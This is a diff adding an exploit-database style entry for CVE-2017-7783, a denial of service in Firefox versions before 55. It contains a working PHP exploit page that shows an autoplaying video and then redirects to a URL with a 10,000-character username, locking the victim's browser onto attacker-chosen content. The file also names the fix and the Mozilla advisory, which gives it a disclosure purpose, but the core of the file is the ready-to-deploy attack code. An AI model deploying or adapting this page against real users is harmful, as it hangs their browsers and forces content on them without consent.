@@ -1,0 +1,38 @@
+# Exploit Title: Mozilla Firefox < 55 - Forcibly make someone view a web content
+# Category: Denial of Service
+# Date: 5/11/17
+# CVE : CVE-2017-7783
+# Affected Version: < Mozilla Firefox 55
+# Tested on: Windows/Linux
+# Software Link: https://www.mozilla.org/en-US/firefox/52.0/releasenotes/
+# Exploit Author: Amit Sangra
+# Website: http://CyberCriminals.net
+ 
+# Description:
+ 
+If a long user name is used in a username/password combination in a site URL (such as http://UserName:Password@example.com), the resulting modal prompt will hang in a non-responsive state or crash, causing a denial of service.
+ 
+# Impact:
+
+An attacker can create a webpage having some content and exploit.
+Now once a victim visits this webpage, his browser gets locked out and he is forcibly made to view attacker supplied content.
+ 
+# Exploit:
+ 
+<?php
+$exploit=str_repeat(chr(0x41),10000);
+$location="http://Username".$exploit.":Password@Firefox.com";
+echo "<center><h1>Firefox Lockout Vulnerability</h1>";
+//Content to be forcibly viewed
+echo "<iframe width=854 height=480 src=https://www.youtube.com/embed/QH2-TGUlwu4?autoplay=1 frameborder=0 allowfullscreen></iframe></center>";
+//End
+echo "<script>setTimeout(\"location.href ='".$location."';\",10000);</script>";
+?>
+ 
+# Solution:
+   
+Update to version 55
+https://www.mozilla.org/en-US/firefox/55.0/releasenotes/
+ 
+# Mozilla Foundation Security Advisory:
+https://www.mozilla.org/en-US/security/advisories/mfsa2017-18/#CVE-2017-7783
